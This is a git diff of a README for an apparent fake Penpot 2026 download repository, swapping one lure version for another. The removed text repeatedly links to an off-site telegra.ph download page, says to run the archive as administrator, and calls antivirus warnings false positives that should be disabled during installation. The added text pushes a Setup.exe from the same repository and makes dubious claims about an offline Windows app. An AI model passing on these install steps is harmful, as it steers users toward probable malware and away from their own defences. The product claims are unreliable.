@@ -1,174 +1,82 @@
-<h1 align="center">🎨 Penpot 2026 – Open-Source Design Platform</h1>
+# 🎨 Penpot-Design-Platform-2026 - Create professional interface designs with ease
 
-<p align="center">
-  <strong>Design & prototype with the power of open source. Self-host, collaborate, and ship faster with standards-based design. 50K+ stars on GitHub.</strong><br>
-  <em>Latest version 2026 | Web-based application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Penpot_2026_Setup-blue.svg)](https://github.com/binarydigitjohnmilton633/Penpot-Design-Platform-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Penpot_2026-00BFFF?style=for-the-badge&logo=penpot&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+Penpot-Design-Platform-2026 serves as a powerful design tool for teams and individuals. It bridges the gap between designers and developers by using standard web formats like SVG, CSS, and HTML. This software provides a local environment for your UI and UX projects.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## 📥 Getting Started
 
----
+You can install this software on your Windows computer in a few minutes. Follow these instructions to set up your design workspace.
 
-## 📦 What's Inside This Repository
+1. Click the download link below.
+2. Select the Setup.exe file from the list.
+3. Save the file to your computer.
+4. Double-click the file to start the installation process.
 
-Welcome to the official distribution page for **Penpot 2026 – The Open-Source Design Platform for Windows PC**.
-This repository provides access to the latest release of the fastest-growing open-source design platform — created by Kaleidos in 2017, open-sourced in 2020, and now with 50K+ stars [citation:1][citation:6].
+[Download Penpot-Design-Platform-2026 Installer](https://github.com/binarydigitjohnmilton633/Penpot-Design-Platform-2026)
 
-✅ **Full Version** – All features included  
-✅ **Self-Hosted** – Full ownership of your design data [citation:3]  
-✅ **Open Standards** – SVG, CSS, HTML, and JSON – no vendor lock-in [citation:5]  
-✅ **Real-Time Collaboration** – Design with your team in real-time [citation:5]  
-✅ **MCP Server** – Native MCP server for AI design workflows [citation:8]  
-✅ **No System Changes** – Works in the browser, safe & secure [citation:7]  
+## 🖥️ System Requirements
 
----
+Ensure your computer meets these requirements for the best experience.
 
-## 📥 How to Get Started?
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core 2.0 GHz or faster.
+* Memory: 8 GB RAM.
+* Storage: 500 MB of free disk space.
+* Graphics: Integrated graphics card with support for modern web standards.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+## 🛠️ How to Install
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+The installer handles the configuration for you. When you run the setup file, a window appears on your screen. Follow the prompts to complete the task.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+1. Locate the file in your Downloads folder.
+2. Right-click the file and select Open.
+3. Follow the on-screen instructions.
+4. Click Finish when the bar fills up to complete the setup.
 
----
+## 📐 Using Your Design Platform
 
-## 🚀 Step-by-Step Guide
+Once you launch the app, you see a blank canvas for your projects. Penpot uses common web languages. This helps you move your ideas to the web without complex translations.
 
-Follow these **3 simple steps** to get started with Penpot 2026 on your PC:
+### Building Your First Project
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Penpot 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+Start a new file to experiment with the interface. Select the New Project button on the dashboard. Use the sidebar tools to draw shapes, add text, or create frames. The right-hand panel controls the styles of your objects. You can change colors, spacing, and borders there.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+### Design and Code
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and configurations.
+Because Penpot uses SVG and CSS, you can view the code for any object on your canvas. This allows developers to see exact layouts. Designers spend less time explaining visuals, and developers spend less time guessing at measurements.
 
----
+### AI Integration
 
-## 🔧 Key Features (2026 Update)
+This version includes an MCP server. This tool connects your design workspace to other smart systems. It helps automate simple tasks and speeds up your workflow. You can enable this feature in the settings menu under the Advanced tab.
 
-| Feature | Description |
-| :--- | :--- |
-| **Web-Based Platform** | No installation needed – runs in your browser, works on any OS [citation:7] |
-| **Self-Hosted & Private** | Full control over your data. Deploy on your own infrastructure [citation:5] |
-| **Open Standards** | Built on SVG, CSS, HTML, and JSON – export clean code [citation:5] |
-| **Real-Time Collaboration** | Design together with your team in real-time [citation:5] |
-| **CSS Flex & Grid Layout** | Design responsive interfaces that behave like real code [citation:3] |
-| **Design Tokens** | Native W3C-standard design tokens – single source of truth [citation:3][citation:12] |
-| **Inspect Mode** | Ready-to-use SVG, CSS, and HTML code for developers [citation:3] |
-| **MCP Server** | AI-powered design workflows – Plugin API exposed to LLMs [citation:8] |
-| **Plugin System** | Extend functionality with plugins or build your own [citation:3] |
-| **Open API** | Full API for automation and custom integrations [citation:3] |
-| **Unlimited Files** | No limits on design files, even on the free plan [citation:3] |
-| **Community-Driven** | 349+ contributors, 130+ releases [citation:6] |
+## 🧩 Features
 
----
+* SVG-based designs: Your work remains sharp at any size.
+* HTML/CSS output: Designers create files that align with web standards.
+* Cross-platform support: Projects exist as web files for easy sharing.
+* Self-hosted safety: Keep your project data on your own machine.
+* Community standards: Join an ecosystem of design systems and tokens.
 
-## 📈 Why Choose Penpot 2026?
+## 💡 Common Questions
 
-- ✅ **Top Open-Source Design Tool** – 50K+ stars, #1 in design tools on GitHub [citation:6]
-- ✅ **Figma Alternative** – Same core features, no paywalls, full data ownership [citation:7]
-- ✅ **Self-Hosted** – Enterprise-grade security and compliance [citation:5]
-- ✅ **Developer-First** – CSS Flex/Grid, inspect mode, clean code export [citation:3]
-- ✅ **AI-Ready** – Native MCP server for LLM-powered design workflows [citation:8]
-- ✅ **No System Changes** – 100% browser-based, safe & secure
+**Does the software require an internet connection?**
+No. This version runs locally on your PC. You only need a connection if you sync your files to external cloud storage.
 
----
+**Where do my files go?**
+The software saves files in your Documents folder by default. You can change this path in the Preferences menu.
 
-## 🔗 Official Download Link
+**Can I import files from other tools?**
+Yes. Use the Import feature in the File menu to bring in common image formats or existing design files.
 
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
+**How do I update the software?**
+When a new version releases, run the setup file again. The app recognizes your current setup and updates your files automatically.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Penpot_2026-00BFFF?style=flat-square&logo=penpot&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
+**Does this support design tokens?**
+Yes. You can define variables for your colors and fonts to keep your project uniform.
 
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
+## 🛡️ Support and Help
 
----
+If you encounter issues during your work, look at the help menu inside the app. It lists common error codes and solutions. If you find a bug, document the steps you took before the error occurred.
 
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. Penpot is a web-based platform that works on any OS [citation:7].
-
-**Q: What makes Penpot different from Figma?**  
-A: Penpot is open-source, self-hostable, and built on web standards (SVG/CSS/HTML). Unlimited free plan, no vendor lock-in [citation:3][citation:7].
-
-**Q: Is it really free?**  
-A: Yes! The free plan is unlimited – unlimited files, unlimited projects, up to 8 team members [citation:11].
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use. MPL-2.0 license [citation:6].
-
-**Q: How often are updates released?**  
-A: Penpot has 80+ releases with active community development [citation:5].
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-**Penpot** is an open-source project by **Kaleidos** .  
-Licensed under **MPL-2.0** .  
-All rights belong to their respective owners. This is not an official distribution channel.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 2.16.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Penpot 2026 Now</a>
-</p>
+Keywords: clojure, design-collaboration, design-platform, design-systems, design-to-code, design-tokens, design-tools, dev-tools, figma-alternative, mcp-server, open-source, open-source-design, penpot, rust, self-hosted, svg-editor, ui-design, ui-ux-design, ux-design, web-standards
